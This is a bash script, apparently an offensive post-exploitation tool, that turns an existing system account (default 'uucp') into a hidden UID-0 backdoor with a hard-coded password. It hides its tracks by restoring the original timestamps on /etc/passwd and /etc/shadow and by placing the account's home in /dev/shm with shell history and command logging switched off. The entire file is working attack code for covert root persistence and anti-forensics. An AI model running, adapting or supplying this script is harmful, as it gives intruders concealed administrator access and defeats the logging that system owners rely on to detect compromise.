#!/usr/bin/env bash

set +o history
echo "[i] - history disabled.."

if [[ $EUID > 0 ]]; then
  echo "[!] - you have to be root ¯\_(ツ)_/¯"
  exit
fi

user=${1:-"uucp"}
password=${2:-"b4ckd00r3d"}
mtime_passwd=`stat -c "%y" /etc/passwd`
mtime_shadow=`stat -c "%y" /etc/shadow`
mtime_passwd_seconds=`stat -c "%y" /etc/passwd | cut -d'.' -f 1 | sed -e "s/[-| |:]//g"`
mtime_shadow_seconds=`stat -c "%y" /etc/shadow | cut -d'.' -f 1 | sed -e "s/[-| |:]//g"`

echo "[!] - /etc/passwd was modified @ ${mtime_passwd}"
echo "[!] - /etc/shadow was modified @ ${mtime_shadow}"

echo "[!] - setting ${user} uid and gid to 0 and enabling shell"
sed -i "s/.*${user}.*/${user}:x:0:0:${user}:\/dev\/shm\/.${user}:\/bin\/bash/" /etc/passwd

echo "[!] - restoring mtime of /etc/passwd to ${mtime_passwd}"
touch -d "${mtime_passwd}" /etc/passwd

echo "[!] - setting ${user} password to ${password}"
echo "${user}:${password}" | chpasswd

echo "[!] - restoring mtime of /etc/shadow to ${mtime_shadow}"
touch -d "${mtime_shadow}" /etc/shadow

echo "[!] - creating home directory in /dev/shm/.${user}"
mkdir -p "/dev/shm/.${user}"

echo "[!] - disabling bash history for ${user} user"
echo "set +o history" > /dev/shm/.${user}/.bash_profile
echo "set +o history" > /dev/shm/.${user}/.bash_rc

echo "[!] - unsetting HISTFILE for ${user} user"
echo "unset HISTFILE" >> /dev/shm/.${user}/.bash_profile
echo "unset HISTFILE" >> /dev/shm/.${user}/.bash_rc

echo "[!] - disabling eventual PROMPT_COMMAND keylogger"
echo "unset PROMPT_COMMAND" >> /dev/shm/.${user}/bash_profile
echo "unset PROMPT_COMMAND" >> /dev/shm/.${user}/bash_rc

echo "[!] - enjoy your new pseudo-root account ツ"
echo "[!] - ${user} : ${password}"

exit
